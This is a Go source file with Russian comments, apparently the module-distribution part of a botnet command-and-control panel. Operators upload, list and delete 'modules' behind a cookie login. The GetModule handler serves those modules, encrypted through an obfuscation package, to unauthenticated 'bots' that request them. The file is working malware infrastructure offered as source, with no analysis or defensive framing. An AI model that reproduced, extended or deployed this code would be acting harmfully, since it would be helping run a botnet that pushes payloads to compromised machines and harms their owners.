package modules

import (
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	utils "../../utils"
	obf "../gate/obf"
	login "../login"

	"github.com/gin-gonic/gin"
)

type ModulesData struct {
	Name string `json:"module_name"`
	Size string `json:"size"`
}

/*
	Обработчик пути /getModulesData/
	Возвращает список всех модулей в папке ./modules/
*/
func GetModulesData(ctx *gin.Context) {
	// не забываем проверить авторизацию
	if !login.CtxAuthCheck(ctx) {
		return
	}

	files, err := ioutil.ReadDir("./modules/")
	if err != nil {
		log.Println("modules.GetModulesData:", err)
	}

	var modulesData []ModulesData

	// проходим по всей папке с модулями
	for _, file := range files {
		module := ModulesData{
			Name: file.Name(),
			Size: utils.ByteCountSI(file.Size()),
		}
		modulesData = append(modulesData, module)
	}

	// если модулей нет - так и ответим
	if len(modulesData) < 1 {
		ctx.JSON(http.StatusOK, "")
		return
	}
	ctx.JSON(http.StatusOK, modulesData)
}

/*
	Загрузка модуля на сервер
*/
func UploadModule(ctx *gin.Context) {
	var uploadForm struct {
		Module *multipart.FileHeader `form:"file"`
		Cookie string                `form:"cookie"`
	}

	// биндим данные из формы в структуру
	ctx.Bind(&uploadForm)

	// не забываем проверить авторизацию
	if !login.AuthCheck(uploadForm.Cookie) {
		return
	}

	file, err := ctx.FormFile("file")
	if err != nil {
		log.Println("modules.UploadModule:", err)
		return
	}

	filename := filepath.Base(file.Filename)
	if err := ctx.SaveUploadedFile(file, filepath.Join("./modules/", filename)); err != nil {
		log.Println("modules.UploadModule:", err)
		return
	}

	// шлём статус 200
	ctx.Status(http.StatusOK)
}

/*
	Удаление модулей
*/
func DelModule(ctx *gin.Context) {
	var delForm struct {
		Cookie     string `json:"cookie"`
		ModuleName string `json:"module_name"`
	}

	// биндим в структуру
	ctx.BindJSON(&delForm)

	// не забываем проверить авторизацию
	if !login.AuthCheck(delForm.Cookie) {
		return
	}

	filename := filepath.Base(delForm.ModuleName)
	path := filepath.Join("./modules/", filename)
	_, err := os.Stat(path)
	if !os.IsNotExist(err) {
		err := os.Remove(path)
		if err != nil {
			log.Println("modules.DelModule:", err)
		}
	}

	ctx.Status(http.StatusOK)
}

/*
	Выдача модулей боту
	В POST-body по ключу data нужно отправить название модуля (например: moduleName| - черта в конце обязательна)
*/
func GetModule(ctx *gin.Context) {
	data_enc := ctx.PostForm("data")
	data := strings.Split(obf.Decrypt(data_enc), "|")
	if len(data) < 2 {
		ctx.String(http.StatusOK, obf.Encrypt("ping|"))
		return
	}

	moduleName := filepath.Base(data[0])
	moduleData, err := ioutil.ReadFile(filepath.Join("./modules/", moduleName))
	if err != nil {
		log.Println("modules.GetModule:", err)
		// не удалось получить модуль - шлём пустой ответ, бот отправит ошибку
		ctx.String(http.StatusOK, "")
		return
	}

	// выдаём зашифрованный модуль
	ctx.String(http.StatusOK, obf.Encrypt(string(moduleData)))
}
